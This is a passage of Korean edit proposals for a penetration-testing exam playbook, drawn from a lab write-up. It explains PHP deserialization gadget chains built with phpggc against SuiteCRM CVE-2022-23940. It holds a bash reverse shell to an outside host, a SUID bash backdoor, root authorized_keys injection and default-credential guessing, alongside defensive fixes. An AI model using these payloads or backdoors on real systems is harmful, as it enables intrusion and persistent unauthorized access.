| 페이로드가 길이 필드 불일치로 파싱 실패 | 직렬화 문자열을 손으로 고쳤다면 `s:<길이>` 값을 다시 계산. **한 글자만 틀려도 통째로 무시됨** |
| 플러시 조건 미충족 | `bufferLimit`/`bufferSize` = `-1`, `initialized` = `true`, `level` = `null`. **틀리면 `flush()` 가 조기 반환해 체인이 조용히 죽음** |

**진단 순서 — 파괴하지 말고 관측부터:**

1. **파싱되는지 확인** — 값을 한 글자 망가뜨려 보냄. 500 이나 다른 에러가 나면 서버가 실제로 역직렬화하고 있다는 증거
2. **체인이 사는지 확인** — RCE 대신 `sleep 10`. 응답이 10초 늦으면 성공
3. **그다음에 셸** — 순서를 지키면 체인 문제와 네트워크 문제를 분리할 수 있음

1번을 건너뛰고 바로 셸을 던지면 안 붙었을 때 원인 후보가 다섯 개로 늘어남. **한 번에 하나씩만 바꿀 것.**

**출처** — [[Crane]] (이 박스에서는 `Monolog/RCE2` 가 한 번에 통했음).
```

**④ 지우기 전 원문** (원본 2-4 말미 + 6장 ⑥ + 2-3 표 일부)

> 확인은 파괴하지 말고 관측부터 한다.
>
> 1. 파싱되는지 확인 — 값을 한 글자 망가뜨려 보낸다. 500이나 다른 에러가 나면 서버가 실제로 역직렬화하고 있다는 증거다
> 2. 체인이 사는지 확인 — RCE 대신 `sleep 10`. 응답이 10초 늦으면 성공
> 3. 그다음에 셸 — 순서를 지키면 체인 문제와 네트워크 문제를 분리할 수 있다
>
> 1번을 건너뛰고 바로 셸을 던지면 안 붙었을 때 원인 후보가 다섯 개로 늘어난다. **한 번에 하나씩만 바꾼다.**

> ### ⑥ 이 유형에서 흔히 막히는 지점 — 역직렬화 체인이 조용히 죽는다
>
> *(이 박스에서는 `Monolog/RCE2`가 한 번에 통했다.)*
>
> 가젯 체인은 터지거나 아무 일도 안 일어나거나 둘 중 하나인데, **실패해도 에러 메시지가 없어서** 디버깅이 어렵다. 원인 후보:
>
> | 원인 | 대응 |
> |---|---|
> | 라이브러리 **버전 불일치** — 체인이 특정 버전의 클래스 구조를 전제한다 | `phpggc -l <라이브러리>`로 RCE1/RCE2/RCE3… 를 순서대로 전부 시도한다 |
> | 대상 라이브러리가 번들되지 않음 | `vendor/composer/installed.json`을 읽을 수 있으면 확인. 못 읽으면 Monolog → Guzzle → Symfony 순으로 시도 |
> | `__destruct`가 예외로 중단 | 다른 체인으로 교체 |
> | 페이로드가 길이 필드 불일치로 파싱 실패 | 직렬화 문자열을 손으로 고쳤다면 `s:<길이>` 값을 다시 계산. **한 글자만 틀려도 통째로 무시된다** |
>
> 진단은 **RCE 대신 `sleep 10`을 먼저 던지는 것**부터 한다. 응답이 10초 늦으면 체인이 살아 있는 것이고, 그 다음에 리버스셸로 바꾼다. 셸이 안 붙는 것이 체인 문제인지 네트워크 문제인지를 분리해준다.

> | `$bufferLimit` / `$bufferSize` / `$initialized` | `-1` / `-1` / `true` | 플러시가 실제로 일어나도록 맞춘 값. **틀리면 `flush()`가 조기 반환해 체인이 조용히 죽는다** |

---

## 제안 9 — 신규 `A-?` : GTFOBins 로 띄운 root 셸이 즉시 죽는다

**② 신규** (A-4 권한상승 절)

**③ 넣을 본문**

```markdown
**증상** — GTFOBins 페이로드가 root 셸을 띄웠는데 곧바로 종료되거나 입력을 못 받음.

| 원인 | 대응 |
|---|---|
| 부모가 비대화형 컨텍스트 — 웹셸이나 파이프 안에서 실행 | **반드시 TTY 가 있는 리버스셸 안에서** 실행할 것 |
| 띄운 셸이 stdin 을 상속받지 못함 | 셸을 잡는 대신 지속성을 심음: `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` → `/tmp/rootbash -p` |
| 페이로드가 인자를 추가로 받아 오작동 | 인자 없이 되는 형태를 고름. `service` 는 서비스명 하나만 넘기면 됨 |

**root 를 잡으면 먼저 되돌아올 길부터 만들 것.**

```bash
cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash    # SUID 백도어 (랩 한정)
# 또는 공개키 주입
mkdir -p /root/.ssh && echo '<내 공개키>' >> /root/.ssh/authorized_keys
```

리버스셸은 언제든 끊기고, root 셸이 끊겨 익스플로잇 전체를 처음부터 다시 도는 것이 시험에서 제일 아까운 시간임.
⚠️ 위 둘은 **랩이라 남겨둔 것**이고, 실제 침투 테스트에서는 이런 흔적을 반드시 보고서에 기록하고 회수함.

**출처** — [[Crane]] (이 박스에서는 `sudo /usr/sbin/service ../../../../../bin/bash` 가 그대로 대화형 root 셸을 줬음).
```

**④ 지우기 전 원문** (원본 6장 ⑨)

> ### ⑨ 이 유형에서 흔히 막히는 지점 — 권한상승 셸이 즉시 죽는다
>
> *(이 박스에서는 `sudo /usr/sbin/service ../../../../../bin/bash`가 그대로 대화형 root 셸을 줬다.)*
>
> GTFOBins 페이로드가 root 셸을 띄웠는데 곧바로 종료되거나 입력을 못 받는 경우가 있다. 원인과 대응:
>
> | 원인 | 대응 |
> |---|---|
> | 부모가 비대화형 컨텍스트 — 웹셸이나 파이프 안에서 실행 | **반드시 TTY가 있는 리버스셸 안에서** 실행한다 |
> | 띄운 셸이 stdin을 상속받지 못함 | 셸을 잡는 대신 지속성을 심는다: `cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash` → `/tmp/rootbash -p` |
> | 페이로드가 인자를 추가로 받아 오작동 | 인자 없이 되는 형태를 고른다. `service`는 서비스명 하나만 넘기면 된다 |
>
> root를 잡으면 먼저 되돌아올 길부터 만든다.
>
> ```bash
> cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash    # SUID 백도어 (랩 한정)
> # 또는 공개키 주입
> mkdir -p /root/.ssh && echo '<내 공개키>' >> /root/.ssh/authorized_keys
> ```
> 리버스셸은 언제든 끊기고, root 셸이 끊겨서 익스플로잇 전체를 처음부터 다시 도는 것이 시험에서 제일 아까운 시간이다.
> 위 둘은 랩이라 남겨둔 것이고, 실제 침투 테스트에서는 이런 흔적을 **반드시 보고서에 기록하고 회수**한다.

---

## 제안 10 — 신규 `B-1-?` : PHP 객체 역직렬화 (PHP Object Injection) + phpggc

**② 신규** (B-1 웹 절). ⚠️ `_PLAYBOOK` 에 현재 PHP 역직렬화 전용 카드가 **없다**(`grep unserialize|phpggc|Monolog|POP 체인` → 본문 언급 4건뿐, 전용 카드 0건). phar 관련 항목(B-1-? `phar://`)과 상호 참조를 걸 것.

**③ 넣을 본문**

````markdown
**`unserialize()` 는 데이터만 복원하지 않는다 — 매직 메서드가 자동 실행된다.**

```php
class User { public $name = "alice"; public $admin = false; }
echo serialize(new User);
// O:4:"User":2:{s:4:"name";s:5:"alice";s:5:"admin";b:0;}
```

**포맷 읽는 법** — 이걸 읽을 줄 알아야 페이로드를 손으로 고칠 수 있음.

| 조각 | 뜻 |
|---|---|
| `O:4:"User"` | Object, 클래스명 길이 4, 클래스명 `User` |
| `:2:` | 프로퍼티 2개 |
| `s:4:"name"` | string, 길이 4, 값 `name`(프로퍼티 이름) |
| `s:5:"alice"` | 그 프로퍼티의 값 |
| `b:0` | boolean false |
| 그 외 | `i:` 정수 · `a:` 배열 · `N;` null |

**매직 메서드 — 개발자가 부르지 않아도 자동 실행됨.**

| 매직 메서드 | 자동 호출 시점 |
|---|---|
| `__construct()` | `new` 로 생성할 때 — **`unserialize()` 에서는 호출되지 않음** |
| `__wakeup()` | `unserialize()` 직후 |
| `__destruct()` | 객체 소멸 시(스크립트 종료·참조 해제) — **반드시 실행됨** |
| `__toString()` | 객체를 문자열로 쓸 때(`echo $obj`, 문자열 연결) |
| `__get()` / `__set()` | 없는 프로퍼티에 접근할 때 |
| `__call()` / `__invoke()` | 없는 메서드 호출 / 객체를 함수처럼 호출할 때 |

공격자가 클래스명과 프로퍼티 값을 정할 수 있으면 그 클래스의 `__destruct`/`__wakeup` 안 코드가 공격자 데이터로 실행됨. `__destruct` 는 예외가 나든 스크립트가 끝나든 어차피 불려 방어 여지가 거의 없음.

**POP 체인(Property-Oriented Programming chain)** — 현실 앱에 `__destruct() { system($this->cmd); }` 같은 친절한 클래스는 없음. 대신 이어붙임:

```text
A::__destruct()          → $this->handler->flush()      를 부른다
   └ B::flush()          → $this->target->write($data)  를 부른다
        └ C::write()     → call_user_func($this->fn, $arg)  ← 여기서 터진다
```

`A` 의 프로퍼티에 `B` 객체를, `B` 의 프로퍼티에 `C` 객체를 중첩해 직렬화 문자열에 넣어두면 `__destruct` 하나가 도미노처럼 굴러감. 각 단계는 그 자체로 정상 코드이고 위험한 것은 **조합**임. 이것이 가젯 체인.

⚠️ **가젯은 앱 자기 코드가 아니라 `vendor/` 라이브러리에서 나온다.** Composer 로 설치되는 Monolog·Guzzle·Laravel·Symfony·Doctrine·PHPUnit(개발 의존성이 배포에 섞이는 사고가 잦음)이 단골. 그래서 **「이 앱에는 위험한 클래스가 없다」는 방어는 성립하지 않음** — `vendor/` 전체가 공격 표면임.
디렉터리 브루트포스에서 `301 /vendor` 가 뜨면 그 자체가 신호.

**phpggc — 알려진 체인을 미리 구현한 생성기.**

```bash
phpggc -l monolog                    # Monolog용 체인 목록
phpggc Monolog/RCE2 system 'id'      # 체인 생성 (직렬화 문자열이 stdout으로)
phpggc Monolog/RCE2 system 'id' -b   # base64로 인코딩해서 출력
```

- `-b` 가 중요함 — 직렬화 문자열에는 `"`·`;`·`{`·`}`·널바이트가 섞여 HTTP 파라미터로 그냥 넣으면 깨짐. 취약점이 애초에 base64 를 기대하는 경우가 많아 그대로 맞물림
- **phpggc 는 익스플로잇이 아니라 페이로드 생성기.** 타겟과 통신조차 하지 않아 msfvenom 과 같은 범주이고 **OSCP 에서 허용됨**(E 절 참조)
- 같은 라이브러리에 RCE1/RCE2/RCE3… 가 있고 **체인마다 진입 클래스가 다름.** 가젯 체인의 모양은 기억으로 쓰지 말고 디스크의 PoC 를 열어 확인할 것

**`Monolog/RCE2` 진입점은 `BufferHandler` 가 아니라 `SyslogUdpHandler` 다.** phpggc `gadgetchains/Monolog/RCE/2/chain.php` 는 `$vector = '__destruct'` 로 두고 `SyslogUdpHandler` 를 최상위에 놓은 뒤 그 `$socket` 프로퍼티에 `BufferHandler` 를 담음.

| 체인 조각 | 공격자가 심는 값 | 역할 |
|---|---|---|
| `SyslogUdpHandler` | 최상위 객체 | `__destruct` 를 가진 진입점. 아무것도 안 해도 요청 끝에 자동 실행 |
| `$socket` | `BufferHandler` 객체 | `SyslogUdpHandler` 가 「소켓을 닫는다」고 믿고 정리 메서드를 부르는 자리. **타입이 검사되지 않으므로 아무 객체나 넣을 수 있음** — 이것이 가젯 연결의 정체 |
| `$buffer` | `[[<OS 명령 문자열>, 'level' => null]]` | 레코드 배열 1개. `['<명령>']` 같은 평평한 배열이 아니라 한 겹 더 감싸인 형태라 `current()` 가 필요해짐 |
| `$bufferLimit` / `$bufferSize` / `$initialized` | `-1` / `-1` / `true` | 플러시가 실제로 일어나도록 맞춘 값 |
| `$processors` | `['current', 'system']` | `current($record)` 가 배열의 첫 원소(=명령 문자열)를 꺼내고, 그 반환값이 다음 반복에서 `system()` 의 인자가 됨 |
| `$level` | `N`(null) | `$record['level'] < $this->level` 조기 반환 회피 |

`['current', 'system']` 이 두 개인 이유는 **타입**임. `call_user_func($processor, $record)` 의 `$record` 는 배열이고 `system(배열)` 은 실패함. 첫 반복에서 `current()` 로 배열→문자열 변환, 그 결과가 재대입되어 두 번째 반복에서 `system('명령')` 이 됨. 타입이 안 맞는 지점을 표준 함수 하나로 변환해 통과시키는 것은 가젯 체인의 상투적 수법이고 `current`·`array_pop`·`reset`·`end` 가 그 자리에 자주 쓰임.

**세 겹으로 포개진 페이로드:**

| 겹 | 내용 | 왜 필요한가 |
|---|---|---|
| ③ 바깥 | `serialize()` 된 객체 그래프 → base64 | 서버가 `base64_decode → unserialize` 하므로 이 형식이어야 발화 |
| ② 중간 | OS 명령 문자열: `echo <b64> \| base64 -d \| bash` | 가젯 체인이 최종적으로 `system()` 에 넘길 인자 |
| ① 안쪽 | `bash -i >& /dev/tcp/<LHOST>/<PORT> 0>&1` 를 base64 인코딩 | 리버스셸 원문의 `&`·`>` 가 중간 경로에서 깨짐 |

**타입 검사로 보호되는 sink 는 반대 타입으로 우회한다** — 이 카드의 핵심 반사.

`is_array()`·`is_string()`·`is_numeric()`·`isset()` 로 감싸인 «정규화» 코드를 보면, **반대 타입을 보내 그 코드를 건너뛸 수 있는지 먼저 볼 것.** PHP 는 `a[]=1`(배열)과 `a=1`(문자열)을 같은 HTTP 파라미터 문법으로 둘 다 표현할 수 있어 이 우회가 유독 쉬움. 같은 성질의 고전 사례가 `strcmp($pw, $_POST['pw'])` 에 배열을 보내 `NULL`(=`0` 으로 느슨 비교) 반환을 유도하는 인증 우회.

**저장과 발화가 다른 함수·다른 요청에서 일어나는 2차(저장형) 역직렬화**라는 점도 함께 볼 것. 저장 시점에는 아무 일도 안 일어나므로 **「페이로드를 보냈는데 반응이 없다」가 실패로 보임.** 트리거 경로를 따로 쳐야 함.

**DB 에서 읽었다고 신뢰 경계 안이 아니다.** 그 컬럼에 무엇이 들어갔는지를 결정한 것은 앞 단계의 `save()` 이고, 거기에 우회 가능한 타입 검사가 있었음. 필터링으로는 못 막음 — 유효한 직렬화 문자열의 형태는 무한하고 공격자는 `vendor/` 의 어떤 클래스든 지정할 수 있음.

**대책** — 사용자 데이터에 `unserialize()` 를 쓰지 않고 `json_decode()` 처럼 객체를 되살리지 않는 포맷으로 갈 것. PHP 7+ 의 `unserialize($data, ['allowed_classes' => false])` 는 이미 설계가 틀어진 뒤의 완충재임.
「클래스명 화이트리스트 검사」도 `allowed_classes` 를 지정하지 않은 `unserialize()` 가 파싱 시점에 이미 객체를 만들기 때문에 늦음. 「base64 로 인코딩했으니 안전」은 base64 가 보호가 아니라는 점에서 틀림.

**post-auth CVE 는 「인증이 필요한가」가 아니라 「어떤 권한이 필요한가」를 확인할 것.** [[Crane]] 의 CVE-2022-23940 은 PoC README 원문이 *"any user with permission to create Scheduled Reports can obtain remote code execution"* — 관리자 전용이 아님. **저권한 계정 하나만 주워도 살아 있음.** 「관리자 자격증명이 없으니 포기」로 판단하면 경로를 통째로 버림. 대개 생각보다 낮음.

**작업 순서가 뒤집힌다** — 취약점 찾기 → 익스플로잇이 아니라 **자격증명 확보가 먼저.** CVE 를 먼저 던지고 「안 되네」라고 판단하면 시간을 태움(B-1-37).

**역직렬화의 지문 — 하나라도 보이면 의심:**

| 신호 | 어디서 보이는가 | 판단 |
|---|---|---|
| 파라미터·쿠키 값이 `O:`/`a:`/`s:` 로 시작 | `Cookie: user=O:4:"User":2:{...}` | PHP 직렬화 원문. 즉시 POP 체인 시도 |
| base64 디코드했더니 위 형태 | 폼 필드·쿠키·`state`·`data` 파라미터 | [[Crane]] 의 `email_recipients` 가 이 경우 |
| base64 가 `rO0AB` 로 시작 | Java 앱 | Java 직렬화 매직바이트 `AC ED 00 05`. ysoserial 대상 |
| base64 가 `gASV`/`gAJ` 로 시작 | Python 앱 | pickle 프로토콜 헤더. `__reduce__` 페이로드 |
| `AAEAAAD/////` | .NET 앱 | `BinaryFormatter`. ysoserial.net 대상 |
| 소스에 `unserialize(`·`readObject(`·`pickle.loads(`·`Marshal.load(`·`yaml.load(` | 화이트박스 리뷰 | 사용자 입력이 여기 닿는지만 추적하면 끝 |
| `vendor/monolog`·`vendor/guzzlehttp`·`vendor/symfony` 디렉터리 노출 | 디렉터리 브루트포스 결과 | 가젯 공급원 존재. phpggc 대상 라이브러리 목록과 대조 |

다른 언어의 대응물 — Java `readObject()`(ysoserial) · .NET `BinaryFormatter` · Python `pickle` · Ruby `Marshal.load`. `pickle.loads(사용자입력)` 을 보면 즉시 RCE 를 의심하는 반사와 같음.

**출처** — [[Crane]] (SuiteCRM 7.12.3 · CVE-2022-23940 · `Monolog/RCE2`).
````

**④ 지우기 전 원문** — 원본 2-1 전량 · 2-2 일부 · 2-3 표 · 2-4 전량. 분량이 커 아래에 절 단위로 인용한다.

> ### 2-1. 배경 지식 — PHP 역직렬화가 왜 코드 실행이 되는가
>
> 직렬화(serialization) 는 메모리 안의 객체를 저장·전송 가능한 문자열로 바꾸는 것이다. PHP에서는 `serialize()` / `unserialize()` 한 쌍이 담당한다.
>
> ```php
> class User { public $name = "alice"; public $admin = false; }
> echo serialize(new User);
> // O:4:"User":2:{s:4:"name";s:5:"alice";s:5:"admin";b:0;}
> ```
>
> 포맷을 읽는 법 — 이걸 읽을 줄 알아야 페이로드를 손으로 고칠 수 있다:
>
> | 조각 | 뜻 |
> |---|---|
> | `O:4:"User"` | Object, 클래스명 길이 4, 클래스명 `User` |
> | `:2:` | 프로퍼티 2개 |
> | `s:4:"name"` | string, 길이 4, 값 `name` (프로퍼티 이름) |
> | `s:5:"alice"` | 그 프로퍼티의 값 |
> | `b:0` | boolean false |
> | 그 외 | `i:` 정수 · `a:` 배열 · `N;` null |
>
> 여기서 걸리는 지점 — `unserialize()`는 데이터만 복원하는 게 아니다. 객체를 문자열에서 되살리는 것뿐인데 왜 코드가 실행되는가.
>
> PHP에는 매직 메서드(magic method)가 있다. 특정 사건이 일어나면 개발자가 부르지 않아도 자동으로 실행되는 메서드다.
>
> | 매직 메서드 | 자동 호출 시점 |
> |---|---|
> | `__construct()` | `new`로 생성할 때 — **`unserialize()`에서는 호출되지 않는다** |
> | `__wakeup()` | `unserialize()` 직후 |
> | `__destruct()` | 객체가 소멸할 때(스크립트 종료·참조 해제) — **반드시 실행된다** |
> | `__toString()` | 객체를 문자열로 쓸 때 (`echo $obj`, 문자열 연결) |
> | `__get()` / `__set()` | 없는 프로퍼티에 접근할 때 |
> | `__call()` / `__invoke()` | 없는 메서드 호출 / 객체를 함수처럼 호출할 때 |
>
> 공격자가 클래스명과 프로퍼티 값을 정할 수 있으면, 그 클래스의 `__destruct`/`__wakeup` 안에 있는 코드가 공격자가 정한 데이터로 실행된다. `__destruct`는 예외가 나든 스크립트가 끝나든 어차피 불리기 때문에 방어할 여지가 거의 없다.
>
> **POP 체인(Property-Oriented Programming chain)**
>
> 현실의 애플리케이션에 `__destruct() { system($this->cmd); }` 같은 친절한 클래스가 있을 리 없다. 대신 이렇게 이어붙인다:
>
> ```text
> A::__destruct()          → $this->handler->flush()      를 부른다
>    └ B::flush()          → $this->target->write($data)  를 부른다
>         └ C::write()     → call_user_func($this->fn, $arg)  ← 여기서 터진다
> ```
>
> `A`의 프로퍼티에 `B` 객체를, `B`의 프로퍼티에 `C` 객체를 중첩해서 직렬화 문자열에 넣어두면 `__destruct` 하나가 도미노처럼 끝까지 굴러간다. 각 단계는 그 자체로는 정상 코드이고 위험한 것은 조합이다. 이 조합을 가젯 체인(gadget chain)이라 부른다.
>
> 가젯은 애플리케이션 자기 코드가 아니라 `vendor/` 안의 라이브러리에서 나온다. Composer로 설치되는 Monolog·Guzzle·Laravel·Symfony·Doctrine·PHPUnit(개발 의존성이 배포에 섞이는 사고가 잦다)이 단골이다. 그래서 **"이 앱에는 위험한 클래스가 없다"는 방어는 성립하지 않는다** — `vendor/` 전체가 공격 표면이다.
> 같은 개념이 다른 언어에도 있다 — Java `readObject()`(ysoserial), .NET `BinaryFormatter`, Python `pickle`, Ruby `Marshal.load`. `pickle.loads(사용자입력)`을 보면 즉시 RCE를 의심하는 반사와 같은 것이다.
>
> **phpggc의 역할**
>
> 가젯 체인을 손으로 만들려면 `vendor/` 전체를 읽고 매직 메서드에서 시작하는 호출 그래프를 추적해야 한다. [phpggc](https://github.com/ambionics/phpggc)는 주요 라이브러리의 알려진 체인을 미리 구현해둔 생성기다.
>
> ```bash
> phpggc -l monolog                    # Monolog용 체인 목록
> phpggc Monolog/RCE2 system 'id'      # 체인 생성 (직렬화 문자열이 stdout으로)
> phpggc Monolog/RCE2 system 'id' -b   # base64로 인코딩해서 출력
> ```
>
> `-b` 플래그가 중요하다 — 직렬화 문자열에는 `"`·`;`·`{`·`}`·널바이트가 섞여 HTTP 파라미터로 그냥 넣으면 깨진다. 이 취약점은 애초에 서버가 base64를 기대하므로 `-b`가 그대로 맞물린다.
>
> phpggc는 익스플로잇이 아니라 페이로드 생성기다. 취약한 엔드포인트에 전달하는 일은 직접 해야 하니 msfvenom과 같은 범주이고, OSCP에서 쓸 수 있다. 시험 금지 정의는 *"automatically discovering and exploiting … without effort or enumeration"* 인데 phpggc는 타겟과 통신조차 하지 않는다.
> 같은 기준으로 3-2의 `exploit.py`도 허용된다 — 특정 CVE 하나를 겨냥한 PoC는 취약점을 스스로 발견하지 않는다.
> 다만 손으로 재구성할 수 있어야 스크립트가 죽었을 때 살아남는다. 그래서 대안 절차를 함께 적어뒀다.

> > `is_array()`·`is_string()`·`is_numeric()`·`isset()` 같은 타입/존재 검사로 감싸인 정규화 코드를 보면, 반대 타입을 보내 그 코드를 건너뛸 수 있는지 먼저 본다. PHP는 `a[]=1`(배열)과 `a=1`(문자열)을 같은 HTTP 파라미터 문법으로 둘 다 표현할 수 있어서 이 우회가 유독 쉽다. 같은 성질을 쓰는 고전 사례가 `strcmp($pw, $_POST['pw'])`에 배열을 보내 `NULL`(=`0`으로 느슨 비교) 반환을 유도하는 인증 우회다.
> >
> > 저장과 발화가 다른 함수·다른 요청에서 일어나는 2차(저장형) 역직렬화라는 점도 같이 봐야 한다. 저장 시점에는 아무 일도 안 일어나므로 **"페이로드를 보냈는데 반응이 없다"가 실패로 보인다.** 트리거 경로를 따로 쳐야 한다.

> 데이터가 흐르는 경로를 단계로 끊으면 이렇다:
>
> | # | 단계 | 무슨 일이 일어나는가 |
> |---|---|---|
> | 1 | `POST /index.php` `module=AOR_Scheduled_Reports&action=Save` | 예약 보고서 생성 권한이 있는 세션으로 저장 요청 |
> | 2 | 폼 필드 `email_recipients`를 배열이 아니라 문자열로 보낸다 | 정상 UI는 수신자 체크박스 여러 개를 배열로 보낸다. 우리는 스칼라 하나를 보낸다 |
> | 3 | `save()`의 `is_array()` 검사 | false → 정규화 분기를 건너뛴다. 값이 손대지 않은 채 통과 |
> | 4 | `parent::save()` → DB `aor_scheduled_reports.email_recipients` 컬럼 | 공격자 입력이 원문 그대로 저장된다 (여기까지는 아무 일도 안 일어난다) |
> | 5 | 조회 경로 `get_email_recipients()` | `unserialize(base64_decode($this->email_recipients))` ← **진짜 sink** |
> | 6 | 문자열 → 임의 클래스의 객체 그래프 | Monolog 클래스들이 복원된다 |
> | 7 | 요청 처리 종료 → 객체 소멸 | `__destruct()` 자동 발화 |
> | 8 | Monolog 가젯 체인 | `__destruct` → … → `call_user_func('system', $cmd)` |
>
> SuiteCRM은 Monolog를 번들하고 있으므로 phpggc의 `Monolog/RCE2` 계열 가젯 체인이 그대로 먹는다.
>
> 결국 이 취약점은 한 줄로 요약된다.
>
> ```php
> $params = unserialize(base64_decode($this->email_recipients));  // DB 컬럼 = 신뢰 경계 밖의 입력
> ```
> **DB에서 읽었다고 신뢰 경계 안이 아니다.** 그 컬럼에 무엇이 들어갔는지를 결정한 것은 앞 단계의 `save()`이고, 거기에 우회 가능한 타입 검사가 있었다. 필터링으로는 못 막는다 — 유효한 직렬화 문자열의 형태는 무한하고, 공격자는 `vendor/`의 어떤 클래스든 지정할 수 있다. 대책은 사용자 데이터에 `unserialize()`를 쓰지 않고 `json_decode()`처럼 객체를 되살리지 않는 포맷으로 가는 것뿐이다. PHP 7 이상의 `unserialize($data, ['allowed_classes' => false])` 옵션은 이미 설계가 틀어진 뒤의 완충재다.
>
> `AOR_Scheduled_Reports` 저장 경로는 인증된 세션을 요구한다. 그래서 이 CVE는 단독으로는 쓸모가 없고 자격증명 확보가 선행 조건인데, 이 박스에서는 `admin:admin`이 그 조건을 채워줬다.
>
> 다만 **"관리자 전용"이 아니다.** PoC 저장소 README 원문은 *"any user with permission to create Scheduled Reports can obtain remote code execution and compromise the server."* — `AOR_Scheduled_Reports` 모듈에 레코드를 만들 수 있는 계정이면 전부 발화한다. 저권한 계정 하나만 주워도 이 CVE는 살아 있다는 뜻이라, "관리자 자격증명이 없으니 포기"라고 판단하면 경로를 통째로 버린다. post-auth CVE를 만나면 "인증이 필요한가"가 아니라 **"어떤 권한이 필요한가"를 어드바이저리/PoC 원문에서 확인**한다. 대개 생각보다 낮다.
>
> 그리고 post-auth CVE는 작업 순서가 뒤집힌다. 취약점 찾기 → 익스플로잇이 아니라 자격증명 확보가 먼저다. 이 박스의 실제 정답 순서도 ① 기본 자격증명 시도 → ② CVE 발사였다. CVE를 먼저 던지고 "안 되네"라고 판단하면 시간을 태운다. 웹 제품을 만나면 CVE를 뒤지기 전에 `admin:admin`·`admin:password`·`admin:<제품명>`·`root:root`를 먼저 친다. 30초면 된다.

> 우리가 최종적으로 던진 것은 세 겹으로 포개진 페이로드다. 안쪽부터 벗겨보면:
>
> | 겹 | 내용 | 왜 이 겹이 필요한가 |
> |---|---|---|
> | ③ 바깥 | `serialize()` 된 Monolog 객체 그래프 → base64 | 서버가 `base64_decode → unserialize` 하므로 이 형식이어야만 발화한다 |
> | ② 중간 | OS 명령 문자열: `echo <b64> \| base64 -d \| bash` | 가젯 체인이 최종적으로 `system()`에 넘길 인자 |
> | ① 안쪽 | `bash -i >& /dev/tcp/192.168.45.207/4444 0>&1` 를 base64로 인코딩 | 리버스셸 원문에 `&`·`>`가 섞여 있어 중간 경로에서 깨진다 |

> **최상위는 `BufferHandler`가 아니라 `SyslogUdpHandler`다.** phpggc의 `gadgetchains/Monolog/RCE/2/chain.php`는 `$vector = '__destruct'` 로 두고 `SyslogUdpHandler`를 최상위에 놓은 뒤 그 `$socket` 프로퍼티에 `BufferHandler`를 담는다. 디스크의 `exploit.py` 페이로드가 정확히 그 모양이다(`O:32:"...SyslogUdpHandler":1:{s:6:"socket";O:29:"...BufferHandler"…`).
> phpggc는 같은 라이브러리에 RCE1/RCE2/RCE3…를 두고 체인마다 진입 클래스가 다르다. 가젯 체인의 모양은 기억으로 쓰지 말고 디스크의 PoC를 열어 확인한다.
>
> 호출이 굴러가는 흐름 `[가정 — 클래스 골격은 위 페이로드로 확정했으나, 아래 메서드 이름과 내부 분기는 Monolog 소스를 이 박스에서 직접 열어 확인하지는 않았다]`:
>
> ```text
> SyslogUdpHandler::__destruct()
>    └ close()
>         └ $this->socket->close()          ← socket 자리에 BufferHandler가 들어 있다
>              └ BufferHandler::flush()      버퍼에 남은 레코드를 다음 핸들러로 밀어낸다
>                   └ 안쪽 BufferHandler::handle($record)
>                        └ foreach ($this->processors as $processor)
>                              $record = $processor($record);        ← ★ 발화 지점
> ```
>
> | 체인 조각 | 공격자가 심는 값 | 역할 |
> |---|---|---|
> | `SyslogUdpHandler` | 최상위 객체 | `__destruct`를 가진 진입점. 아무것도 안 해도 요청 끝에 자동 실행 |
> | `$socket` | `BufferHandler` 객체 | `SyslogUdpHandler`가 "소켓을 닫는다"고 믿고 `close()`를 부르는 자리. **타입이 검사되지 않으므로 아무 객체나 넣을 수 있다** — 이것이 가젯 연결의 정체다 |
> | `$buffer` | `[[<OS 명령 문자열>, 'level' => null]]` | 레코드 배열 1개. 안쪽 원소 하나가 명령 문자열이다. `['<명령>']` 같은 평평한 배열이 아니라 한 겹 더 감싸인 형태라는 점이 중요하다 — 그래서 `current()`가 필요해진다 |
> | `$bufferLimit` / `$bufferSize` / `$initialized` | `-1` / `-1` / `true` | 플러시가 실제로 일어나도록 맞춘 값. **틀리면 `flush()`가 조기 반환해 체인이 조용히 죽는다** |
> | `$processors` | `['current', 'system']` | `current($record)`가 배열의 첫 원소(=명령 문자열)를 꺼내고, 그 반환값이 다음 반복에서 `system()`의 인자가 된다 |
> | `$level` | `N`(null) | `$record['level'] < $this->level` 조기 반환을 피하기 위한 값 |
>
> `['current', 'system']`이 두 개인 이유는 타입이다. `call_user_func($processor, $record)`의 `$record`는 배열이고 `system(배열)`은 실패한다. 첫 반복에서 `current()`로 배열을 문자열로 바꾸고, 그 결과가 `$record`에 재대입되어 두 번째 반복에서 `system('명령')`이 된다. 타입이 안 맞는 지점을 표준 함수 하나로 변환해 통과시키는 것은 가젯 체인의 상투적인 수법이고, `current`·`array_pop`·`reset`·`end`가 그 자리에 자주 쓰인다.

> ### 2-4. 일반화 — 역직렬화 취약점의 지문을 알아보는 법
>
> CVE-2022-23940 자체는 두 번 다시 안 나오고, 다시 나오는 것은 패턴이다. 아래 신호 중 하나라도 보이면 역직렬화를 의심한다.
>
> | 신호 | 어디서 보이는가 | 판단 |
> |---|---|---|
> | 파라미터·쿠키 값이 `O:`/`a:`/`s:`로 시작 | `Cookie: user=O:4:"User":2:{...}` | PHP 직렬화 원문 그대로. 즉시 POP 체인 시도 |
> | base64 디코드했더니 위 형태 | 폼 필드·쿠키·`state`·`data` 파라미터 | 이 박스의 `email_recipients`가 정확히 이 경우 |
> | base64가 `rO0AB` 로 시작 | Java 앱 | Java 직렬화 매직바이트 `AC ED 00 05`. ysoserial 대상 |
> | base64가 `gASV`/`gAJ` 로 시작 | Python 앱 | pickle 프로토콜 헤더. `__reduce__` 페이로드 |
> | `AAEAAAD/////` | .NET 앱 | `BinaryFormatter`. ysoserial.net 대상 |
> | 소스에 `unserialize(`·`readObject(`·`pickle.loads(`·`Marshal.load(`·`yaml.load(` | 화이트박스 리뷰 | 사용자 입력이 여기 닿는지만 추적하면 끝 |
> | `vendor/monolog`·`vendor/guzzlehttp`·`vendor/symfony` 디렉터리 노출 | 디렉터리 브루트포스 결과 | 가젯 공급원이 있다는 뜻. phpggc 대상 라이브러리 목록과 대조 |

